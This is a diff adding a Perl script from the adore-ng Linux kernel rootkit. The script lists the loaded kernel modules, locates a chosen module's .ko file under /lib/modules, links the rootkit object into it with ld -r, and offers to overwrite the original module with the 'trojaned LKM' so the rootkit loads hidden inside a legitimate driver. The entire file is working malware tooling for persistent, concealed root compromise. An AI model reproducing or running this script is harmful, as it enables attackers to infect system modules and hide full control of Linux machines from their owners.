@@ -1,0 +1,54 @@
+#!/usr/bin/perl
+
+print "\nThis script may be used to relink adore into\n".
+      "already existing LKMs on the system. This is the Kernel 2.6\n".
+      "version of 'relink'. Note that -DRELINKED has to be switched on\n".
+      "in the Makefile. Modules compiled with this switch cant work stand alone.\n\n";
+
+$| = 1;
+open(I, "</proc/modules") || die $!;
+
+print "The following LKMs are available:\n\n";
+$i = 0;
+while ($_ = <I>) {
+	if (($i++ % 5) == 0) {
+		print "\n";
+	}
+	/(\w+) /;
+	$module = $1;
+	print "$module ";
+}
+
+print "\n\nChose one: ";
+$lkm = <STDIN>;
+$lkm =~ s/\n//;
+print "Choice was >>>$lkm<<<\n";
+print "Searching for $lkm.ko ...\n";
+
+$u = `uname -r`;
+$u =~ s/\n//;
+$lkm_path = `find /lib/modules/$u -name $lkm.ko`;
+$lkm_path =~ s/\n//;
+if ($lkm_path eq "") {
+	print "No LKM with that name found!\n";
+	exit;
+}
+
+print "Found $lkm_path!\n";
+
+system("cp $lkm_path t.ko");
+system("./symsed t.ko zero;ld -r adore-ng-2.6.ko t.ko -o z.ko; rm -f t.ko");
+print "\nCopy trojaned LKM back to original LKM? (y/n)\n";
+
+while ($yn !~ /^(y|n)$/i) {
+	$yn = <STDIN>;
+	$yn =~ s/\n//;
+}
+
+if ($yn =~ /y/i) {
+	system("cp z.ko $lkm_path");
+} else {
+	print "\nOutput LKM is z.ko\n";
+}
+
+
